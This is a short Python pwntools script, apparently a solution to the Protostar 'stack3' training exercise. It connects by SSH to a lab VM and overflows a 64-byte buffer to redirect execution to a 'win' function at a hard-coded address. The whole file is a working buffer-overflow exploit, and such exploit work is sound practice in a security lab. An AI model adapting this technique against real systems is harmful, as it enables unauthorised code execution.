
from pwn import *
import os

ip = os.getenv("PROTOSTAR")
shell = ssh('user', ip, password='user')
sh = shell.run("sh")
sh.sendline("cd /opt/protostar/bin/")


win = 0x8048424
exploit = "A"*64 + p32(win)
sh.sendline("./stack3")
print(sh.recvline(timeout=1))
sh.sendline(exploit)
print(sh.recvline(timeout=1))
print(sh.recvline(timeout=1))
